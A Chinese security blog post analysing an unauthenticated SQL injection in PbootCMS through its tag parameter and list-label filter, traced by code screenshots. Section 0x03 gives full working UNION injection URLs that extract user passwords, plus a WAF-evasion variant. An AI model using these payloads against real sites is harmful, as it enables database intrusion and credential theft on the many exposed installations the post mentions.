#  PbootCMS前台SQL注入漏洞（下）   
原创 烽火台实验室  Beacon Tower Lab   2024-12-24 01:35  
  
**0x01前言**  
  
在前一篇文章中介绍了一个仍然可以用于最新版PbootCMS的老漏洞DVB-2021-2510,并对漏洞流程进行分析，给出了在有限条件下利用漏洞的方式。  
  
  
本文将在前一篇文章的基础上继续给出新的PbootCMS SQL注入漏洞，并对利用方式进行更深入的探讨。  
  
  
  
**0x02漏洞分析**  
  
由于PbootCMS使用了模板的方法来组合产品页面内容，为了支持可扩展性，支持非常复杂的语法，对基础内容想了解的可以先看文章https://xz.aliyun.com/t/14090。  
  
  
apps/home/controller/TagController.php文件中，会把外部传入的数据get('tag')替换模板文件中的内容。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCJAYKEGZJZibQbyGcr1ofSvKkoq3phfqeZR0z4ynsHF9biakvGZHchib5w/640?wx_fmt=png&from=appmsg "")  
  
图1  
  
  
这里的get('tag')和上一篇文章中的request($key, 'vars')有一个很大的区别是没有第二个参数，我们跟进get方法，看一下没有第二个参数的传值有哪些限制。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCEOeVEV74LGn277rS6l4dzXf00peZlwNNwsu38jNmRqWVWyYffWH1ZQ/640?wx_fmt=png&from=appmsg "")  
  
图2  
  
  
如果没有传入第二个参数，默认值为null。跟进filter方法，可以看出在filter对类型和数据的安全检查中，第二个参数为null并不会命中任何一个条件判断，也就是不会对数据值进行任何限制。这里因为$condition['d_type']为null也不会因此而报错。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzC1iciadibjyOwblVDcEYiaEoLDEGib5cgOxf1a4wKBQoibicK2WGg6TTkQjknA/640?wx_fmt=png&from=appmsg "")  
  
图3  
  
  
虽然数据类型检测，但是filter方法中仍然有对其值的过滤方式，会替换很多标签相关的内容。这里需要重点标记一下，因为后面的SQL注入要用到这里过滤不完整的标签。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzC4mfnwRya458qt7iacnGTZyDOQ9trokydrZcgldnVTDicHg1RglBfV0cw/640?wx_fmt=png&from=appmsg "")  
  
图4  
  
  
回到图1的代码中，外部传入的get('tag')经过方法parserPositionLabel会替换模板文件中的部分内容，跟进parserPositionLabel方法。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCbUcW0JibsR69XkOoNufUOGSdFY2WrCCNHQXZjHZynlcZHONiajVp5MCw/640?wx_fmt=png&from=appmsg "")  
  
图5  
  
  
这里外部传入的数据变成了变量$link，并且经过替换之后响应到页面的<a>标签的href属性中。这里假设我们传入了{pboot:xxx}，只要不在图4禁止的pboot标签中，则可能导致标签注入。pboot支持的标签有很多，具体要用哪个标签来达到漏洞利用的效果，还需要继续往下面跟进。  
  
  
在图1的代码中继续往下，跟进parserAfter方法，这个方法中会解析大多数pboot标签。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCic2soxM06QcpBMKrm1CAJ5TeJIY9ciakAllaZImInsosVVQvbhNQdZcw/640?wx_fmt=png&from=appmsg "")  
  
图6  
  
  
我们这里用到的是parserListLabel方法，这个方法的主要作用是解析数据列表，至于是不是还有其它的方法也可以利用，小伙伴可以自行探索。继续跟进parserListLabel方法。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCvliaYNSF4h2pmYjUAPUkqPgAceTxKQtkx1W8txPyzabZviaJibuYS4icRw/640?wx_fmt=png&from=appmsg "")  
  
图7  
  
  
如果我们传入的get('tag')的值中包含了{pboot:list}标签，则会按照parserListLabel方法中的解析逻辑对其中的值进行正则提取，并保存到变量$params中。具体parserParam的函数我就不跟了，其实就是简单的正则提取，我们继续往下跟进$params变量的处理逻辑。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzC2K1gwmKLVEOUlYY2VWibjeL4PQEPLiaAZyOGvlReTo0rEkmytSbLn9Uw/640?wx_fmt=png&from=appmsg "")  
  
图8  
  
  
当$params的键名是filter时，也就是外部传入的参数为{pboot:list filter=xxx [list:link link=asd]{/pboot:list}。会把xxxx设置为变量$filter的值，继续跟下面的调用逻辑。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCDyGic6TpokpOj3DmG9Cm05WeO7hib12icQf6nCoqEcribgtNianC10ymbFw/640?wx_fmt=png&from=appmsg "")  
  
图9  
  
  
按照｜对$filter进行切割之后，其中$filter[0]会直接拼接到$where1数组的值中，从这里已经可以看出来似乎进行了SQL语句的可控拼接。继续往下看一下$where1变量的调用逻辑。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCmseSeAdhUpicY6PcNo21YybWNpV201MYjpPlKKB2B01LVRPibdwQLqvg/640?wx_fmt=png&from=appmsg "")  
  
图10  
  
  
和上一篇文章的逻辑相似，上一篇文章的注入点在getList方法的参数$where3，这次的注入在参数$where1。跟进getList方法。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCtltaiaDnru0Fxy0Nc3OXx24leHhN0zO002wFsJ3qIOePpNm1Q0weMNA/640?wx_fmt=png&from=appmsg "")  
  
图11  
  
  
外部传入的$where1变量会直接进入where方法中，从图9可以看出这里的filter时一个数组，并且其键名为数字。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCCBx8rjaQvhBdSDibOqlDFC2B9icxnGKdQ6EIQE5pfFP2kUkL7Th0hS8g/640?wx_fmt=png&from=appmsg "")  
  
图12  
  
  
这也就导致了SQL注入漏洞。  
  
  
  
**0x03漏洞利用**  
  
从本质上来说此漏洞的漏洞利用要比上一篇文章的利用简单，因为这里不涉及对特殊字符的限制，而且这里有回显可以进行联合注入。在本地搭建的演示环境中进行测试，利用下面的payload查询ay_user表第一个用户的密码字段  
  
  
http://localhost:8890/PbootCMS329?tag=xxx:%7bpboot%3alist%20filter%3d1%3d2%29UNION%2f%2a%2a%2fSELECT%2f%2a%2a%2f1,2,3,4,5,(select/**/password/**/from/**/ay_user/**/limit/**/0,1),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c123%20scode%3d123%7d%5blist%3alink%20link%3dasd%5d%7b%2fpboot%3alist%7d  
  
  
查看源代码，会在如下位置回显对应的结果信息  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCMX0SRbBCqBe4Hf6pTLMeIqgu8DvwiaZk1xUmKywjjV1Hcibj2Qg0dc0Q/640?wx_fmt=png&from=appmsg "")  
  
图13  
  
  
  
这里面有几个注意点是需要说明的  
  
  
1）payload不允许用空格，因为在图7解析{pboot:list}标签时调用的parserParam方法按照空格进行截断，如下所示。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8E5sfrfkeAOnWGHhvTbA47BOUAlsVxzCib5VudIsTvPJfic6iaQ3D0PNDObXdxbTYvoXfbpoXoicibRXVFELgcExibhQ/640?wx_fmt=png&from=appmsg "")  
  
图14  
  
  
  
2)  注释符问题。对于mysql数据库，这里只能使用#单行注释，而不能使用--单行注释；对于sqlite数据库，这里只能使用--单行注释，而不能使用#单行注释。这主要还是空格的原因，  
我通过下面一张表来说明这个小技巧。  
  
  
<table><tbody><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;"><span style="background-color: rgb(255, 255, 255);">语句</span></p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;"><span style="background-color: rgb(255, 255, 255);">数据库</span></p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;"><span style="background-color: rgb(255, 255, 255);">备注</span></p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 --a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">mysql</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法错误，--后面必须有空白字符</p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 --/**/a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">mysql</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法错误，--后面必须有空白字符</p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 -- a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">mysql</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法正确</p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 #a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">mysql</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法正确</p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 # a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">mysql</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法正确</p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 --a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">sqlite</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法正确，--后面可以没有空格</p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 -- a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">sqlite</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法正确</p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 #a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">sqlite</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法错误，不支持#注释</p></section></td></tr><tr><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">select 1 # a</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">sqlite</p></section></td><td colspan="1" rowspan="1" style="border-color: rgb(62, 62, 62);padding: 0px;" width="33.3300%"><section style="padding-right: 5px;padding-left: 5px;text-align: center;"><p style="word-break: break-all;">语法错误，不支持#注释</p></section></td></tr></tbody></table>  
  
  
  
因为PbootCMS的payload不允许使用空格，所以造成了一个很奇怪的结论。  
  
  
3) 在实网环境下，不同的站点union select的函数是不一样的，要基于实际情况进行调整。  
  
  
虽然我们现在已经能完全的对目标进行注入（包括mysql和sqlite两种数据库），而且是有回显的联合查询，但是当前的payload特征非常明显，极易被WAF查杀。有没有某种绕过WAF的方式呢？  
  
  
当然是有的，PbootCMS有复杂的模板替换逻辑，只要找一个字符串替换为空的操作，然后在关键字中一直插入干扰字符，就可以轻易绕过WAF，如果你现在倒回去看一下图4，你就会发现x3e｜x3c会是一个不错的选择，例如你可以使用使用下面的payload  
  
  
http://localhost:8890/PbootCMS329?tag=xxx:%7bpboot%3alist%20filter%3d1%3d2%29UNIx3eON%2fx3e%2a%2a%2fSELx3eECT%2fx3e%2a%2a%2f1,2,3,4,5,(selx3eect/**/pax3essword/**/frx3eom/x3e**/ay_user/**/lix3emit/x3e**/0,1),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c123%20scode%3d123%7d%5blist%3alink%20link%3dasd%5d%7b%2fpboot%3alist%7d  
  
  
  
  
**0x04 结论**  
  
当前我们已经能无限制的对PbootCMS进行SQL注入了，有超过30W的互联网案例都受此漏洞影响。我认为这是2024最好用的漏洞，你觉得呢？  
  
  
  
  
  
  
